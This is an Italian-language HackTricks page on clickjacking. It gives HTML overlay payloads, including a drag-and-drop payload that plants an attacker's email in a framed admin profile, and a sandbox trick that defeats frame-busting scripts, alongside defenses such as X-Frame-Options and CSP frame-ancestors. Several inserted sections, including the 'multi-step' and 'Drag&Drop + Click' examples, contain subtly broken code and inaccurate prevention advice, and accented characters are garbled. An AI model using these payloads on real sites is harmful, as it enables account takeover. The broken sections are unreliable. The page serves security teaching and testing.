# Clickjacking

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare flussi di lavoro** con gli strumenti comunitari pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Cos'√® il Clickjacking

In un attacco di clickjacking, un **utente** viene **ingannato** per **cliccare** su un **elemento** in una pagina web che √® **invisibile** o mascherato come un elemento diverso. Questa manipolazione pu√≤ portare a conseguenze indesiderate per l'utente, come il download di malware, il reindirizzamento a pagine web malevole, la fornitura di credenziali o informazioni sensibili, trasferimenti di denaro o l'acquisto online di prodotti.


### Trucco per precompilare i moduli

A volte √® possibile **riempire il valore dei campi di un modulo utilizzando i parametri GET durante il caricamento di una pagina**. Un attaccante pu√≤ sfruttare questo comportamento per riempire un modulo con dati arbitrari e inviare il payload di clickjacking in modo che l'utente prema il pulsante Invia.

### Riempire il modulo con Drag\&Drop

Se hai bisogno che l'utente **compili un modulo** ma non vuoi chiedergli direttamente di scrivere alcune informazioni specifiche (come l'email e/o una password specifica che conosci), puoi semplicemente chiedergli di **trascinare e rilasciare** qualcosa che scriver√† i tuoi dati controllati come in [**questo esempio**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Payload di base
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload a pi√π passaggi

In alcuni casi, potrebbe essere necessario utilizzare un payload a pi√π passaggi per eseguire un attacco di clickjacking. Questo tipo di payload coinvolge l'utilizzo di pi√π pagine web per ingannare l'utente e ottenere il controllo del suo clic.

Ecco un esempio di payload a pi√π passaggi:

```html
<iframe src="pagina1.html" style="opacity:0; z-index:-1; position:absolute; top:0; left:0; width:100%; height:100%;" allow="autoplay"></iframe>
<iframe src="pagina2.html" style="opacity:0; z-index:-1; position:absolute; top:0; left:0; width:100%; height:100%;" allow="autoplay"></iframe>
<iframe src="pagina3.html" style="opacity:0; z-index:-1; position:absolute; top:0; left:0; width:100%; height:100%;" allow="autoplay"></iframe>
```

In questo esempio, vengono utilizzati tre iframe per caricare tre diverse pagine web. Questi iframe sono posizionati in modo da essere invisibili all'utente e sovrapposti al contenuto desiderato. Quando l'utente clicca sul contenuto visibile, in realt√† sta cliccando su uno dei frame invisibili, consentendo all'attaccante di eseguire azioni non autorizzate.

√à importante notare che il payload a pi√π passaggi pu√≤ richiedere una pianificazione e un'implementazione pi√π complessa rispetto a un payload singolo. Tuttavia, pu√≤ essere utile in determinate situazioni in cui un attacco di clickjacking tradizionale non √® sufficiente per raggiungere l'obiettivo desiderato.
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Payload Drag\&Drop + Click

Il payload Drag\&Drop + Click √® una tecnica di attacco che sfrutta la vulnerabilit√† di clickjacking per ingannare l'utente e ottenere il controllo del suo browser. Questa tecnica sfrutta la funzionalit√† di trascinamento e rilascio (Drag\&Drop) per eseguire azioni non autorizzate sul browser dell'utente.

#### Funzionamento

1. L'attaccante crea una pagina web malevola che contiene un elemento nascosto, come un pulsante o un link, che l'utente non pu√≤ vedere.
2. L'attaccante utilizza il codice JavaScript per sovrapporre l'elemento nascosto su un altro elemento visibile e attraente sulla pagina, come un pulsante di download o un video interessante.
3. Quando l'utente clicca sull'elemento visibile, in realt√† sta cliccando sull'elemento nascosto, che pu√≤ eseguire azioni non autorizzate come il download di file dannosi o il completamento di transazioni indesiderate.
4. L'attaccante pu√≤ anche sfruttare la funzionalit√† di trascinamento e rilascio per eseguire azioni non autorizzate, ad esempio trascinando un file dal computer dell'utente sulla pagina web malevola.

#### Prevenzione

Per proteggersi dagli attacchi di clickjacking, √® possibile adottare le seguenti misure preventive:

- Implementare l'header HTTP `X-Frame-Options` con il valore `DENY` o `SAMEORIGIN` per impedire il caricamento della pagina in un iframe non autorizzato.
- Utilizzare il tag HTML `<iframe>` con l'attributo `sandbox` per limitare le azioni consentite all'interno dell'iframe.
- Utilizzare il tag HTML `<meta>` con l'attributo `Content-Security-Policy` per specificare le origini consentite per il caricamento della pagina.
- Utilizzare il tag HTML `<a>` con l'attributo `rel="noopener noreferrer"` per impedire l'accesso al window.opener dell'elemento cliccato.
- Mantenere il software e i plugin del browser aggiornati per beneficiare delle patch di sicurezza pi√π recenti.

#### Esempio di attacco

```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking Attack</title>
  <style>
    #hiddenButton {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <h1>Clickjacking Attack</h1>
  <button onclick="downloadFile()">Download Now</button>
  <iframe src="https://www.example.com" width="800" height="600"></iframe>
  <button id="hiddenButton"></button>
  <script>
    function downloadFile() {
      document.getElementById('hiddenButton').click();
    }
  </script>
</body>
</html>
```

In questo esempio, l'attaccante crea una pagina web che sovrappone un pulsante nascosto su un pulsante visibile. Quando l'utente clicca sul pulsante visibile, in realt√† sta cliccando sul pulsante nascosto, che esegue l'azione di download del file.
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Se hai identificato un attacco **XSS che richiede all'utente di fare clic** su un elemento per **scatenare** l'XSS e la pagina √® **vulnerabile al clickjacking**, puoi sfruttarlo per ingannare l'utente affinch√© faccia clic sul pulsante/link.\
Esempio:\
_Hai trovato un **self XSS** in alcuni dettagli privati dell'account (dettagli che **solo tu puoi impostare e leggere**). La pagina con il **modulo** per impostare questi dettagli √® **vulnerabile** al **clickjacking** e puoi **precompilare** il **modulo** con i parametri GET._\
\_\_Un attaccante potrebbe preparare un attacco di **clickjacking** a quella pagina **precompilando** il **modulo** con il **payload XSS** e **ingannando** l'**utente** affinch√© **invii** il modulo. Cos√¨, **quando il modulo viene inviato** e i valori vengono modificati, l'**utente eseguir√† l'XSS**.

## Strategie per mitigare il Clickjacking

### Difese lato client

Gli script eseguiti lato client possono eseguire azioni per prevenire il Clickjacking:

* Assicurarsi che la finestra dell'applicazione sia la finestra principale o superiore.
* Rendere tutti i frame visibili.
* Impedire i clic sui frame invisibili.
* Rilevare e avvisare gli utenti di possibili tentativi di Clickjacking.

Tuttavia, questi script di protezione dei frame possono essere elusi:

* **Impostazioni di sicurezza dei browser:** Alcuni browser potrebbero bloccare questi script in base alle loro impostazioni di sicurezza o alla mancanza di supporto JavaScript.
* **Attributo HTML5 `sandbox` dell'iframe:** Un attaccante pu√≤ neutralizzare gli script di protezione dei frame impostando l'attributo `sandbox` con i valori `allow-forms` o `allow-scripts` senza `allow-top-navigation`. Questo impedisce all'iframe di verificare se √® la finestra superiore, ad esempio,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
I valori `allow-forms` e `allow-scripts` abilitano le azioni all'interno dell'iframe mentre disabilitano la navigazione al livello superiore. Per garantire la funzionalit√† desiderata del sito preso di mira, potrebbero essere necessarie autorizzazioni aggiuntive come `allow-same-origin` e `allow-modals`, a seconda del tipo di attacco. I messaggi della console del browser possono guidare nella scelta delle autorizzazioni da consentire.

### Difese lato server

#### X-Frame-Options

L'header di risposta HTTP **`X-Frame-Options`** informa i browser sulla legittimit√† del rendering di una pagina in un `<frame>` o `<iframe>`, contribuendo a prevenire il Clickjacking:

* `X-Frame-Options: deny` - Nessun dominio pu√≤ incorniciare il contenuto.
* `X-Frame-Options: sameorigin` - Solo il sito corrente pu√≤ incorniciare il contenuto.
* `X-Frame-Options: allow-from https://trusted.com` - Solo l'URI specificato pu√≤ incorniciare la pagina.
* Nota le limitazioni: se il browser non supporta questa direttiva, potrebbe non funzionare. Alcuni browser preferiscono la direttiva CSP frame-ancestors.

#### Direttiva frame-ancestors di Content Security Policy (CSP)

La direttiva **`frame-ancestors` in CSP** √® il metodo consigliato per la protezione dal Clickjacking:

* `frame-ancestors 'none'` - Simile a `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Simile a `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Simile a `X-Frame-Options: allow-from`.

Ad esempio, la seguente CSP consente solo l'incorniciamento dallo stesso dominio:

`Content-Security-Policy: frame-ancestors 'self';`

Ulteriori dettagli e esempi complessi possono essere trovati nella [documentazione di frame-ancestors CSP](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) e nella [documentazione di frame-ancestors CSP di Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) con `child-src` e `frame-src`

**Content Security Policy (CSP)** √® una misura di sicurezza che aiuta a prevenire il Clickjacking e altri attacchi di iniezione di codice specificando quali origini il browser dovrebbe consentire di caricare il contenuto.

#### Direttiva `frame-src`
- Definisce le origini valide per i frame.
- Pi√π specifica della direttiva `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Questa politica consente frame dalla stessa origine (self) e https://trusted-website.com.

#### Direttiva `child-src`
- Introdotto in CSP livello 2 per impostare le origini valide per i web worker e i frame.
- Funziona come fallback per frame-src e worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Questa politica consente frame e worker dalla stessa origine (self) e da https://trusted-website.com.

**Note sull'utilizzo:**
- Deprecazione: child-src sta venendo gradualmente sostituito da frame-src e worker-src.
- Comportamento di fallback: se frame-src √® assente, child-src viene utilizzato come fallback per i frame. Se entrambi sono assenti, viene utilizzato default-src.
- Definizione di origine rigorosa: includere solo origini affidabili nelle direttive per prevenire l'exploit.

#### Script JavaScript di interruzione del frame

Sebbene non completamente sicuri, gli script di interruzione del frame basati su JavaScript possono essere utilizzati per impedire che una pagina web venga incorniciata. Esempio:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Utilizzo di token Anti-CSRF

* **Validazione del token:** Utilizzare token anti-CSRF nelle applicazioni web per garantire che le richieste che modificano lo stato siano effettuate intenzionalmente dall'utente e non attraverso una pagina Clickjacked.

## Riferimenti

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro supportati dagli strumenti della comunit√† pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, consulta i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
